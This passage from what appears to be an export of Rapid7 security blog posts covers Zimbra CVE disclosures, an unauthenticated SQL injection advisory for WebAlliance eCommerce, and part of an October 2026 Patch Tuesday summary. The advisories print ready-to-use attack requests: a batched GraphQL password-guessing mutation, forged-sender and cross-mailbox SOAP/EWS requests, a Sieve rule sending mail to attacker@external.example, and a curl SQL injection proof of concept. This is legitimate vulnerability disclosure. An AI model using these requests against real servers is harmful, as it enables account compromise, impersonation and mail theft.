+// ZimbraInvalidLoginFilter.doFilter() // ... whitelist, disabled-filter and existing-suspension handling omitted chain.doFilter(request, response); if (req.getAttribute(AUTH_FAILED) != null) { // [0] wrapper-supplied signal // ... logging omitted boolean loginFailed = (Boolean)req.getAttribute(AUTH_FAILED); if (loginFailed) { // ... per-IP counter lookup and initialization omitted if (count.incrementAndGet() > this.maxFailedLogin) { this.numberOfFailedOccurence.put(clientIp, count); this.suspiciousIpAddrLastAttempt.put( clientIp, System.currentTimeMillis()); } this.numberOfFailedOccurence.put(clientIp, count); } // ... final debug logging omitted }
+
+At [0], failure processing begins only if the downstream path added auth.failed to the request. The relevant SOAP exception path is:
+
+// SoapEngine.dispatchRequest() // ... earlier dispatch handling omitted catch (AccountServiceException.AuthFailedServiceException e) { HttpServletRequest httpReq = (HttpServletRequest)context.get(""servlet.request""); httpReq.setAttribute(""auth.failed"", (Object)Boolean.TRUE); // [1] failure becomes visible String clientIp = (String)context.get(REQUEST_IP); httpReq.setAttribute(REQUEST_IP, (Object)clientIp); response = soapProto.soapFault((ServiceException)e); // ... debug and informational logging omitted }
+
+At [1], SoapEngine.dispatchRequest() sets the attribute before returning the authentication fault. A failed SOAP login therefore reaches the check at [0] and increments the source-IP counter.
+
+GraphQL skips the SOAP failure handler
+
+Modern Zimbra's GraphQL extension builds an ordinary AuthRequest, then reaches its handler through XMLDocumentUtilities.executeDocumentAsGuest():
+
+// XMLDocumentUtilities.executeDocumentAsGuest() public static Element executeDocumentAsGuest(DocumentHandler handler, Element request, RequestContext rctxt) throws ServiceException { HashMap<String, Object> context = new HashMap<String, Object>(); context.put(""zimbra.context"", GQLAuthUtilities.getGuestZimbraSoapContext(request.getQName(), handler, rctxt)); context.put(""servlet.request"", rctxt.getRawRequest()); context.put(""servlet.response"", rctxt.getRawResponse()); return handler.handle(request, context); // [2] bypasses SoapEngine }
+
+At [2], the helper calls the authentication handler without passing through SoapEngine. An incorrect password still becomes a GraphQL error, but the catch block at [1] never runs. The attribute read at [0] is absent, so the filter does not increment the source-IP counter.
+
+Exploitation
+
+Batched authentication
+
+An unauthenticated client sends JSON to /service/extension/graphql. GraphQL aliases let its query field invoke authenticate repeatedly with different passwords:
+
+mutation { a0: authenticate(authInput: {account: {accountBy: name, key: ""victim@example.test""}, password: ""pass0""}) { authToken } a1: authenticate(authInput: {account: {accountBy: name, key: ""victim@example.test""}, password: ""pass1""}) { authToken } a2: authenticate(authInput: {account: {accountBy: name, key: ""victim@example.test""}, password: ""pass2""}) { authToken } }
+
+Each alias performs a real authentication operation. Failures appear in the GraphQL errors array, while a successful alias returns an authentication token under its corresponding name. The GraphQL engine imposes no application-level alias limit on this path. The whole document remains one HTTP request, so Jetty's request-count control sees one request rather than the number of login operations inside it.
+
+Alias execution is sequential and backend-bound, so the rate depends on the deployment. Using 100 aliases per request, 10,000 candidates completed in under two minutes without the Zimbra IP counter or Jetty's request filter blocking the source. The vulnerability removes IP-level failed-login accounting and reduces request overhead.
+
+The CVE-2026-93637 PoC accepts an ordinary password file, generates the batched GraphQL documents and reports the accepted candidate.
+
+Figure 1: Metasploit module tests 1500 passwords in 15 requests, successfully identifying the correct password in the final batch.
+
+Per-account lockout
+
+The IP counter is not Zimbra's only possible control. Its separate per-account lockout policy is disabled by default, but when enabled, failed GraphQL operations still increment the target local account's counter and stop further guessing when that account locks.
+
+CVE-2026-93635 and external LDAP
+
+On domains configured with external LDAP search-filter authentication and lazy auto-provisioning, CVE-2026-93635 turns the login field into a password oracle for an external directory user. LdapUtil.computeDn() substitutes a wildcarded login such as jdoe*@example.test into the configured filter without escaping it. If that pattern selects one directory entry, Zimbra tries the candidate password against that user. An incorrect password returns account.AUTH_FAILED; a correct password passes the LDAP bind and reaches lazy provisioning, producing a different response.
+
+The wildcarded login is not the name of an existing local Zimbra account, so the optional per-account lockout has no account against which to record the failed attempt. Sending the same operation through GraphQL also avoids the source-IP counter. With per-account lockout enabled and its threshold set to five, repeated wrong candidates incremented neither counter, while a correct password remained distinguishable. This two-bug composition applies only to the stated external-LDAP configuration, not Zimbra's default local-authentication path.
+
+The LDAP/GraphQL composition PoC and CVE-2026-93635 tracker entry cover this configured external-directory path in detail. The CVE-2026-93637 tracker entry records the standalone finding and affected-version evidence.
+
+Impact
+
+Anyone who can reach the public GraphQL endpoint can make repeated password guesses without triggering Zimbra's source-IP suspension. Batching several candidates also reduces the number of HTTP requests and the associated network overhead. This makes weak, reused or previously exposed passwords more practical to test, but it does not reveal a strong password or bypass a separate MFA check.
+
+Email impersonation via SaveDraftRequest (CVE-2026-73571)
+
+SaveDraftRequest has a delegated-sending path selected by isDelegatedReq. On a vulnerable server, an ordinary user can place another local address in the request's From field. The handler resolves that address to its mailbox, assumes the mailbox owner's authority and calls Zimbra's normal send routine without checking whether the signed-in account has send-as rights. This is an application authorization failure, not a forged display name or a hand-written SMTP header: Zimbra submits the attacker's message as the selected account and adds the corresponding item to that account's Sent folder.
+
+The target must be on the same mailbox server, but the attack requires no optional Zimbra feature, existing delegation, administrator right or victim action.
+
+Technical Analysis
+
+Claimed sender becomes mailbox authority
+
+After the request parser extracts the From address, the delegated branch resolves that address to a local account and reads an optional delegateeAccountId:
+
+// SaveDraft.handle() excerpt // ... message fields, From address and delegation attributes parsed above if (mailAddress != null) { delegatorAccount = prov.get( Key.AccountBy.name, mailAddress, zsc.getAuthToken()); // [0] account named by From } if (isDelegatedReq) { delegatorMbox = MailboxManager.getInstance() .getMailboxByAccountId(delegatorAccount.getId()); Account delegateeAccount = null; OperationContext oct = null; if (delegateeAccountId != null) { delegateeAccount = prov.getAccountById(delegateeAccountId); oct = new OperationContext(delegateeAccount); // [1] supplied account context } else if (delegatorMbox != null) { oct = new OperationContext(delegatorMbox); // [2] claimed sender context } if (oct != null && delegatorMbox != null) { mm = ParseMimeMessage.parseMimeMsgSoap( zsc, oct, delegatorMbox, msgElem, null, mimeData); boolean deliveryReport = false; // ... optional delivery-report update omitted SendMsg.doSendMessage(oct, delegatorMbox, mm, mimeData.uploads, null, ""r"", null, null, false, false, false, deliveryReport); // [3] platform delivery } // ... response construction omitted }
+
+There is no checkRight(), canAccessAccount(), or canSendAs() call between resolving the account at [0] and delivery at [3]. In the demonstrated request, delegateeAccountId is absent. At [2], Zimbra constructs the operation context from the mailbox named in From, causing the later send to treat the selected account as the caller. [3] then submits the message through Zimbra's legitimate sending path.
+
+There is a second way to trigger the flaw. The attacker can supply the claimed sender's account UUID in delegateeAccountId. At [1], Zimbra constructs the operation context directly from that account and reaches the same impersonation result without checking the identity that was actually signed in.
+
+Exploitation
+
+Sending as a local identity
+
+The relevant SaveDraftRequest body is:
+
+<SaveDraftRequest xmlns=""urn:zimbraMail"" isDelegatedReq=""1""> <m> <e t=""t"" a=""recipient@example.test""/> <e t=""f"" a=""ceo@example.test""/> <su>Updated payroll review</su> <mp ct=""text/plain""><content>Please review the changes.</content></mp> </m> </SaveDraftRequest>
+
+Because Zimbra submits the message through its legitimate infrastructure, the issue goes beyond display-name spoofing. On a deployment whose legitimate outbound mail passes SPF, DKIM, and DMARC, the impersonated message passes them too: it uses the same source MTA, signing domain, RFC sender, and envelope sender as legitimate mail from the selected account. Local testing confirmed that sender alignment and normal MTA path.
+
+The CVE-2026-73571 PoC submits the delegated request with an operator-selected sender, recipient, subject and message body. On the affected build, the message arrived with the CEO as its RFC sender, and the same subject appeared in the CEO's Sent folder.
+
+Figure 2: The victim's Inbox displays the forged message as an ordinary internal email from the CEO.
+
+Impact
+
+An attacker can impersonate any local user, not only an administrator or executive. Internally, that allows believable payment requests, changes to account details, malicious links, false instructions and fraudulent approvals. Normal display-name spoofing warnings and external-sender banners do not help because Zimbra submits the message as the selected local user.
+
+Zimbra also places the forged message in the impersonated user's Sent folder. This leaves a fabricated record of authorship and can support an attempt to frame that user.
+
+Figure 3: The same forged message is recorded in the CEO's Sent folder.
+
+For external recipients, the attacker can send from a finance account to request new payment details, use an operations account to cancel or alter an order, or send scams and abusive mail under an employee's address. The consequences depend on the role and relationships of the selected sender.
+
+The same trusted-delivery advantage applies to exploit-bearing mail. The next article will examine browser-side findings that an attacker can deliver from any chosen local account. Impersonation is not required for the XSS itself, but can make the message appear to come from somebody the recipient trusts.
+
+Fix
+
+The patch in ZCS 10.1.17 retains the account that actually signed in unless it has an explicit send-as or send-on-behalf-of right. An unauthorized delegated request consequently runs as the caller rather than the account named in the message.
+
+EWS cross-user mailbox access (CVE-2026-10631)
+
+Zimbra's EWS extension uses composite folder IDs intended for shared-mailbox operations. FindItem trusts the owner UUID inside an attacker-supplied ID and constructs the authorization context from the selected mailbox instead of the account that signed in. This Insecure Direct Object Reference (IDOR) lets any ordinary EWS-enabled account read complete items from other users' mailboxes without a share or delegation grant.
+
+The attacker needs zimbraFeatureEwsEnabled=TRUE. Although disabled by default, deployments using Zimbra's Outlook desktop integration commonly enable EWS class-of-service-wide. The target account does not need EWS enabled, and no target-user action is required.
+
+Technical analysis
+
+Composite IDs select the mailbox
+
+To address a shared item, EWS needs to identify both the mailbox that owns it and the item or folder inside that mailbox. Zimbra encodes this as {ownerUUID}_{numericId}. For example:
+
+5e05e6e2-8810-4c2a-a7ac-3771df62e344_2 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^ owner UUID +-- folder 2 (Inbox)
+
+When FindItem receives a composite ID, FolderUtil.parseItemId() separates the owner and numeric portions. The owner value is then passed to ItemUtil.getGrantorMailbox():
+
+// ItemUtil.getGrantorMailbox() public static Mailbox getGrantorMailbox(String ownerId) throws ServiceException { Provisioning prov = Provisioning.getInstance(); Account ownerAcct = prov.get(Key.AccountBy.id, ownerId); // [0] supplied owner UUID Mailbox mailboxOwnr = MailboxManager.getInstance() .getMailboxByAccount(ownerAcct); // [1] selected mailbox return mailboxOwnr; }
+
+At [0], EWS resolves the supplied owner UUID to a local account; [1] retrieves that account's mailbox. Neither method receives the caller's identity.
+
+The mailbox becomes the authenticated identity
+
+The authenticated account and selected mailbox are then passed to ItemOperation:
+
+// ItemOperation.ItemOperation() public ItemOperation(Account account, Mailbox mailbox, ZimbraAuth zimbraAuth) throws ServiceException { this.account = account; // [2] authenticated attacker this.mailbox = mailbox; // [3] selected owner's mailbox this.octxt = mailbox == null ? new OperationContext(account) : new OperationContext(mailbox); // [4] selected owner context this.zimbraAuth = zimbraAuth; this.octxt.setUserAgent(zimbraAuth.getUserAgent()); }
+
+[2] is the attacker account. Supplying a victim UUID makes [3] the victim mailbox, so it is not null. [4] therefore creates OperationContext from the victim mailbox instead of the attacker account.
+
+// OperationContext constructors public OperationContext(Mailbox mbox) throws ServiceException { this(mbox.getAccount()); // [5] target mailbox owner } public OperationContext(Account acct) { this(acct, false); } public OperationContext(Account acct, boolean admin) { this.authuser = acct; // [6] identity used for permission checks // ... remaining context initialization omitted }
+
+[5] extracts the victim account from that mailbox, and [6] stores the victim as the authenticated user. The mailbox then compares this identity with its owner:
+
+// Mailbox.getAuthenticatedAccount() Account getAuthenticatedAccount() { // ... context and authenticated-user lookup omitted if (authuser != null && authuser.getId().equals(this.getAccountId())) { authuser = null; // [7] matching identity is treated as owner access } return authuser; }
+
+The identities match, so [7] changes the authenticated user to null, which downstream checks treat as owner access. The attacker's request is consequently authorized as the victim. EWS has used the untrusted owner UUID both to select a mailbox and to decide who is authenticated. The numeric folder ID is subsequently resolved within that owner context, allowing FindItem to access any folder in the selected mailbox.
+
+Exploitation
+
+Resolving a target mailbox
+
+A target UUID is available through ordinary authenticated directory lookups. Both GetAccountInfoRequest and SearchGalRequest return zimbraId for a known local address. The PoC uses GetAccountInfoRequest:
+
+<GetAccountInfoRequest xmlns=""urn:zimbraAccount""> <account by=""name"">victim@example.test</account> </GetAccountInfoRequest>
+
+The response contains the target's UUID:
+
+<attr name=""zimbraId"">5e05e6e2-8810-4c2a-a7ac-3771df62e344</attr>
+
+Appending _2 to the UUID forms the target's Inbox identifier. The attacker sends the following EWS request to /service/extension/zimbraews, or to /EWS/Exchange.asmx when EWS is exposed through Zimbra's standard proxy:
+
+<m:FindItem Traversal=""Shallow"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types""> <m:ItemShape> <t:BaseShape>AllProperties</t:BaseShape> <t:IncludeMimeContent>true</t:IncludeMimeContent> </m:ItemShape> <m:IndexedPageItemView MaxEntriesReturned=""5"" Offset=""0"" BasePoint=""End""/> <m:ParentFolderIds> <t:FolderId Id=""5e05e6e2-8810-4c2a-a7ac-3771df62e344_2""/> </m:ParentFolderIds> </m:FindItem>
+
+The server returns the selected mailbox's data in the EWS response:
+
+<ns2:Message xmlns:ns2=""http://schemas.microsoft.com/exchange/services/2006/types""> <!-- Complete base64 MIME and other returned fields omitted. --> <ns2:ItemId Id=""5e05e6e2-8810-4c2a-a7ac-3771df62e344_380"" ChangeKey=""600""/> <ns2:Subject>Project Phoenix acquisition timeline</ns2:Subject> <ns2:Body BodyType=""Text"">The target accepted the preliminary terms. Board approval is due Friday. Keep this strictly confidential.</ns2:Body> <ns2:HasAttachments>true</ns2:HasAttachments> <ns2:From><ns2:Mailbox> <ns2:EmailAddress>finance@northbridge.example</ns2:EmailAddress> </ns2:Mailbox></ns2:From> <ns2:InternetMessageId><20261005150023.563F6400B9@mail.lab.local></ns2:InternetMessageId> </ns2:Message>
+
+The CVE-2026-10631 PoC obtains that UUID and creates the composite ID automatically.
+
+Cross-account folder reads
+
+Changing the numeric component selects another well-known folder:
+
+Folder
+
+Crafted ID
+
+Unauthorized result
+
+Inbox
+
+{uuid}_2
+
+Received messages and attachments
+
+Sent
+
+{uuid}_5
+
+Messages sent by the target
+
+Drafts
+
+{uuid}_6
+
+Unfinished messages
+
+Contacts
+
+{uuid}_7
+
+Address-book entries
+
+Calendar
+
+{uuid}_10
+
+Appointments and meeting data
+
+If the target mailbox is on another server in the same Zimbra cluster, the first server forwards the crafted request. The receiving server resolves its local mailbox from the same owner UUID and reaches the vulnerable FindItem constructor.
+
+The CVE-2026-10631 tracker entry covers the full response, affected folders and multi-server path in detail.
+
+Impact
+
+EWS exposes the victim's private message bodies and attachments, as well as drafts, sent mail, contacts and calendar data. The attacker can monitor conversations and use their history to make the separate impersonation attack more credible.
+
+An attacker can also request a password reset for another service, monitor the corresponding mailbox and consume the link. EWS does not bypass third-party MFA by itself, but it exposes an email channel that many services still treat as sufficient proof. Because the owner UUID is attacker-selected, the same ordinary EWS account can repeat these reads against other local mailboxes.
+
+Note that an earlier version of this analysis, presented at BruCON 2026, attributed GetItem, send, move and delete to the same flaw. Comparing intermediate Network Edition releases during this research required multiple restored VM appliances, because EWS is license-gated and normal patching advances the complete system; one appliance retained a separate mailbox authorization state that obscured the boundary, which initially made the impact appear broader. Repeating each operation with explicit authorization and target-state controls narrowed the CVE to FindItem, which still exposes complete MIME and attachments.
+
+Fix
+
+The patch in ZCS 10.1.20 creates the EWS authorization context from the account that signed in, not the mailbox selected by the composite ID. Zimbra applied that correction to both local and remote mailbox operations.
+
+Sieve notify forwarding-restriction bypass (CVE-2026-50055)
+
+zimbraFeatureMailForwardingInFiltersEnabled=FALSE is meant to stop users creating server-side mail-forwarding rules. Zimbra enforces it by rejecting Sieve redirect, but accepts notify even though that action can send selected headers and the complete text body to an arbitrary external address. An authenticated user can therefore install persistent mail exfiltration despite the administrator's restriction. If forwarding is normally allowed, there is no policy boundary to bypass.
+
+Technical analysis
+
+Redirect is the only blocked action
+
+Both the ModifyFilterRulesRequest and ModifyOutgoingFilterRulesRequest SOAP commands call checkForwardFilterAttr() before saving a rule. The check recognizes only one action type:
+
+// DocumentHandler.checkForwardFilterAttr() public boolean checkForwardFilterAttr(Account account, List<FilterRule> filterRules, String filterRuleType) throws ServiceException { if (!account.isFeatureMailForwardingInFiltersEnabled() && !filterRules.isEmpty()) { for (FilterRule filterRule : filterRules) { if (!Objects.requireNonNull(filterRule.getFilterActions()).stream() .anyMatch(FilterAction.RedirectAction.class::isInstance) // [0] redirect only || this.checkIfFilterAlreadyExists(filterRule, account, filterRuleType)) continue; return false; } } return true; // [1] all other actions allowed }
+
+At [0], the policy classifies only RedirectAction as forwarding, meaning NotifyAction and RFCCompliantNotifyAction reach [1] even though they can send attacker-selected message content to an external email address.
+
+Notify expands message content
+
+These actions can include message content rather than just a generic alert because SoapToSieve.getSieveScript() enables the variables and enotify extensions. FilterUtil.getVarsMap() then supplies the values available to the notification:
+
+// FilterUtil.getVarsMap() excerpt // ... case-insensitive variable-map construction omitted Enumeration enumeration = mimeMessage.getAllHeaders(); while (enumeration.hasMoreElements()) { Header header = (Header)enumeration.nextElement(); vars.put(header.getName().toLowerCase(), ZInternetHeader.decode( mimeMessage.getHeader(header.getName(), "",""))); // [2] decoded headers } vars.put(""subject"", parsedMessage.getSubject()); MPartInfo bodyPart = Mime.getTextBody(parsedMessage.getMessageParts(), false); if (bodyPart != null) { // ... IOException handling omitted vars.put(""body"", Mime.getStringContent( bodyPart.getMimePart(), mailbox.getAccount().getPrefMailDefaultCharset())); // [3] selected text body } return vars;
+
+When the rule runs, Notify.executeBasic() expands those variables into the notification subject and body. [2] makes decoded headers available, and [3] supplies the text part selected by Mime.getTextBody(). It does not supply raw MIME or attachments.
+
+Exploitation
+
+Installing persistent exfiltration
+
+An authenticated user can place the following rule object inside ModifyFilterRulesRequest:
+
+<filterRule name=""Email Notification"" active=""1""> <filterTests condition=""allof""><trueTest/></filterTests> <filterActions> <actionNotify a=""attacker@external.example"" su=""Fwd: ${subject}"" content=""From: ${from} To: ${to} Subject: ${subject} ${body}""/> <actionKeep/> </filterActions> </filterRule>
+
+actionKeep leaves the original message in the user's Inbox, while each matching delivery sends the selected message text and headers to the external address.
+
+The CVE-2026-50055 PoC preserves existing filters while installing the notify rule. After an ordinary message arrived for the filtered account, another mailbox received its subject, sender, recipients, date and complete text body. The CVE-2026-50055 tracker entry has the complete affected-version information.
+
+Figure 4: The notification delivered to the attacker contains the subject, headers and complete text body of the victim's message.
+
+Hidden from Modern
+
+The persistence is not apparent in Modern. During testing, the server returned the active notification rule while the same account's Filters view remained empty. The server continued to run the rule normally, but Modern did not give the account owner a way to discover or remove it.
+
+Figure 5: Modern's Filters view does not display the active Sieve notify rule.
+
+Classic did list the attacker-selected name under Active Filters, but its overview did not expose the notification address or copied fields. The rule is therefore not invisible from every client, and an attacker can choose a less conspicuous name.
+
+Figure 6: Classic displays the attacker's rule name but not the external destination or copied fields.
+
+Impact
+
+The flaw defeats an administrator's attempt to prevent users from forwarding mail with server-side filters. An attacker with an authenticated session can install the rule directly. It continues to disclose future message text and headers after that session expires or the password changes, without appearing in Modern's Filters view. It does not forward attachments or raw MIME.
+
+Fix
+
+The patch in ZCS 10.1.20 treats notify and its RFC-compliant variant as forwarding actions and rejects them under the same account policy as redirect.
+
+Remediation
+
+Apply the latest supported Zimbra release. Zimbra's security advisory lists CVE-2026-73571 as fixed in ZCS 10.1.17 and CVE-2026-10631 and CVE-2026-50055 as fixed in ZCS 10.1.20. No fixed release is publicly listed for CVE-2026-93635 or CVE-2026-93637 at the time of publication, so install the security update containing those fixes when Zimbra releases it.
+
+Upgrading does not remove filter rules already saved to accounts. Administrators should inspect the stored incoming and outgoing filter rules for external actionNotify and RFC-compliant notify actions that violate forwarding policy; Modern's Filters view is not sufficient for this review.
+
+Detection and Incident Response
+
+A reverse proxy or web application firewall that inspects request bodies can detect multiple authenticate aliases in one anonymous GraphQL request. Zimbra's EWS logs expose cross-user operations involving two different account UUIDs, as shown in the EWS IoCs. Saved notify rules and outbound notification traffic provide more direct evidence of the Sieve path.
+
+EWS creates no delegation grant to revoke, Sieve rules remain as saved account state, and sender impersonation can generate ordinary Sent and MTA artifacts. Recovery must cover those server-side changes and any other mailbox reached, not only the password of the account first compromised.
+
+Credit
+
+The assessment was conducted by Jonah Burgess (CryptoCat), Senior Security Researcher at Rapid7, in accordance with Rapid7's vulnerability disclosure policy.
+
+Disclosure timeline
+
+April 17, 2026: Rapid7 submitted an initial report covering 23 findings.
+
+April 24, 2026: Zimbra acknowledged the report.
+
+May 21, 2026: Zimbra confirmed they validated 10 of the 23 findings, three of which were duplicates.
+
+May 28, 2026: ZCS 10.1.17 fixed CVE-2026-73571.
+
+June 1, 2026: Zimbra requested an embargo on publication until the planned ZCS 10.1.18 release in September.
+
+June 16 and July 7, 2026: ZCS 10.1.18 and 10.1.19 were released without additional fixes from th [truncated for CSV - full text is in the JSON export]"
+dac935bc9c93,dac935bc9c93,2026-10-14 12:47 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Vulnerability Management; Server & Workload Protection,Article,Unauthenticated SQL Injection In Channel Software WebAlliance eCommerce,https://www.rapid7.com/blog/post/ve-unauthenticated-sql-injection-in-channel-software-weballiance-ecommerce,"Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered CVE-2026-108065, an SQL Injection vulnerability (CWE-89) in...","Overview
+
+While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered CVE-2026-108065, an SQL Injection vulnerability (CWE-89) in Channel Software WebAlliance eCommerce.The exploit allows a malicious actor to read sensitive data from the database, or, if the database user has high privileges, run system commands on the database server. The vulnerability, scored as CVSSv3.1 9.8 (Critical).
+
+Product Description
+
+WebAlliance eCommerce by Channel Software is an all-in-one B2B e-commerce, digital catalog, and customer portal platform purpose-built for wholesale distributors and industrial manufacturers.
+
+Impact
+
+The SQL Injection exploit can be leveraged to view sensitive information in the database, such as user PII and passwords. If logged in with DB admin privileges, the vulnerability can be exploited to run system commands on the server running the database.
+
+Credit
+
+This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy.
+
+CVE-2026-108065 - Unauthenticated SQL Injection
+
+Technical Details
+
+Rapid7 exploited the vulnerability during blackbox testing and was unable to perform root cause analysis.The sUserID parameter in the GetUser method in a SOAP request to /preapproval.asmx doesn’t properly escape the user supplied sUserID. The SQL query can be escaped by inserting a single quote in the parameter. The database is running Microsoft SQL Server which allows for stacked queries. The query can be escaped with ( ‘; ) to inject completely new SQL commands.
+
+POST /preapproval.asmx HTTP/2 Host: {target_site} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Soapaction: http://tempuri.org/GetUser Content-Type: text/xml;charset=UTF-8 Content-Length: 377 <soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:tem=""http://tempuri.org/""> <soapenv:Header/> <soapenv:Body> <tem:GetUser> <!--type: string--> <tem:sUserID>90'; { INJECT_MSSQL_STATEMENT_HERE } ;--</tem:sUserID> </tem:GetUser> </soapenv:Body> </soapenv:Envelope>
+
+If a single quote inserted, the SQL server will fail to parse the query and return a syntax error in the HTTP response:
+
+HTTP/2 200 OK Cache-Control: private, max-age=0 Content-Type: text/xml; charset=utf-8 Server: Microsoft-IIS/10.0 X-Frame-Options: SAMEORIGIN P3p: CP=""Potato"" Date: { Date } Content-Length: 440 <?xml version=""1.0"" encoding=""utf-8""?><soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema""><soap:Body><GetCustomerResponse xmlns=""http://tempuri.org/""><GetCustomerResult>Incorrect syntax near 'ZZZ'. Unclosed quotation mark after the character string ''.</GetCustomerResult></GetCustomerResponse></soap:Body></soap:Envelope>
+
+Information can be extracted using time based SQL injection payloads. For example, a query can be injected to force the database to sleep for 2 seconds if the database user is a sysadmin:
+
+POST /preapproval.asmx HTTP/2 Host: {target_site} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Soapaction: http://tempuri.org/GetUser Content-Type: text/xml;charset=UTF-8 Content-Length: 377 <soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:tem=""http://tempuri.org/""> <soapenv:Header/> <soapenv:Body> <tem:GetUser> <!--type: string--> <tem:sUserID>90';IF IS_SRVROLEMEMBER('sysadmin') = 1 WAITFOR DELAY '00:00:02';-- </tem:sUserID> </tem:GetUser> </soapenv:Body> </soapenv:Envelope>
+
+If the database user is sysadmin, SQL Ole Automation can be used to upload a file.
+
+If the database is running from the same server as the web application, ASPX files can be uploaded. They can then be browsed to run their code and perform system commands on the server.
+
+Proof-of-Concept (POC) Example:
+
+Curl POC:
+
+curl --path-as-is -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Soapaction: http://tempuri.org/GetCustomer' -H $'Content-Type: text/xml;charset=UTF-8' \ --data-binary $'<soapenv:Envelope xmlns:soapenv=\""http://schemas.xmlsoap.org/soap/envelope/\"" xmlns:tem=\""http://tempuri.org/\"">\x0d\x0a <soapenv:Header/>\x0d\x0a <soapenv:Body>\x0d\x0a <tem:GetCustomer>\x0d\x0a <!--type: string-->\x0d\x0a <tem:sCustID>90\'; { YOUR_SQL_STATEMENT_HERE } ;-- </tem:sCustID>\x0d\x0a </tem:GetCustomer>\x0d\x0a </soapenv:Body>\x0d\x0a</soapenv:Envelope>' \ $'https://{target_host}/preapproval.asmx'
+
+Remediation
+
+Block access to /preapproval.asmx.
+
+Disclosure Timeline
+
+July 13 2026: Issue discovered by Marcus Chang, and exploitation reported to the Vector Command customer.
+
+August 28, 2026: Initial contact with Channel Software.
+
+September 8, 15, and 29, 2026: Follow up email sent to Channel Software to confirm initial contact and provide details of the correct channel to share the details of the vulnerability.
+
+October 9, 2026: Follow up email sent to Channel Software informing them of public disclosure on October 14 and assignment of CVE, along with a request for a vendor statement. Rapid7 received no response from Channel Software.
+
+October 14, 2026: Public disclosure via publication of this blog post."
+f1e8bbf0dad6,f1e8bbf0dad6,2026-10-13 21:40 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Vulnerability Management,Article,Patch Tuesday - October 2026,https://www.rapid7.com/blog/post/em-patch-tuesday-october-2026,"exe and associated libraries and APIs, and for the second time this year, the Windows Shell is the site of an exploited-in-the-wild zero-day vulnerability","Microsoft is publishing 1,413 own-product vulnerabilities on October 2026 Patch Tuesday, including 1,102 vulnerabilities in Windows. Anyone who enjoyed last month’s record-setting Patch Tuesday will love the October 2026 edition, because it’s much bigger still. As Rapid7 has noted over the course of 2026, there is every reason to suppose that vulnerability volumes will continue to rise. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, as well as public disclosure for two others.
+
+Windows Shell: zero-day security feature bypass
+
+The Windows Shell is Microsoft’s term for the GUI interaction logic for the entire OS provided by explorer.exe and associated libraries and APIs, and for the second time this year, the Windows Shell is the site of an exploited-in-the-wild zero-day vulnerability. Today’s specimen is CVE-2026-96951. Once again, the immediate prize for an attacker is a Mark of the Web (MOTW) bypass. What this means is that Windows won’t provide the user with a dialog explaining that Windows protected their PC, because in this case, it didn’t. Exploitation requires that a user opens a specially crafted malicious file or visits an attacker-controlled site, so the evergreen advice about being careful what you click remains valid. Fans of vintage operating systems should note that Windows Server 2012 doesn’t receive a patch, although Server 2012 R2 does. The advisory acknowledges reporters from multiple organizations, although none from within Microsoft. The vulnerability also affected Microsoft’s Outlook.com cloud services, although Outlook.com was patched in a build dated several weeks ago.
+
+.NET Framework: zero-day security feature bypass
+
+Microsoft is aware of some level of public disclosure of CVE-2026-108398, a .NET Framework security feature bypass. Exploitation requires an attacker with an existing foothold to register a malicious .NET assembly for loading by a protected process, bypassing Windows Defender Application Control (WDAC) enforcement. Microsoft rebranded WDAC as App Control for Business several years ago, so you may know it under its new name. The Microsoft Learn page for Application Control for Windows points out that “your organization's data is one of its most valuable assets... and threat actors want it”, and this is, of course, correct. The patch presumably removes an attacker-controlled location from the list of places .NET Framework searches for registered assemblies, which are typically contained within DLLs and executables. If any further indications were needed that vulnerability volumes are increasing industry-wide, this is only the second month that Microsoft has published vulnerabilities with six-digit CVE numbers, but these extra-large CVEs will seem unremarkable from now on.
+
+Outlook: multiple no-interaction RCEs
+
+The sheer volume of vulnerabilities in recent Patch Tuesday releases can easily include several examples of potentially concerning vulnerabilities, each of which might have been more remarkable in its own right back when volumes were lower. Today, Microsoft has published five separate remote code execution vulnerabilities in Outlook where the preview pane is a vector, meaning that simply scrolling past an email in the Outlook reading pane would be sufficient to trigger exploitation. Worse still, Outlook might helpfully display the preview without any user interaction at all. All five of CVE-2026-70242, CVE-2026-97749, CVE-2026-97016, CVE-2026-88156, and CVE-2026-70291 receive fixes in the same patches. No-interaction Outlook preview pane vulnerabilities can sometimes feature prominently in state-backed actor campaigns, with CVE-2023-23397 as a prominent example in this category.
+
+Edge: security updates unclear
+
+In September 2026, Microsoft did not appear to publish any desktop browser security advisories between the start of the month and Patch Tuesday. In October, a slightly different approach has emerged: several recent entries in the Edge security updates release notes mention new versions of Edge which incorporate the latest updates from the Chromium project, but without detailing which vulnerabilities have been fixed, stating instead, “CVE's will be added as soon as available,” and directing readers to the Security Update Guide (SUG). At the time of writing, the SUG lists a total of zero vulnerabilities addressed in Edge in the first 13 days of October, and the “CVE’s added soon” message has been up for over a week. As a result, defenders have no obvious way of knowing which recent vulnerabilities Microsoft has addressed in Edge.
+
+Microsoft lifecycle update
+
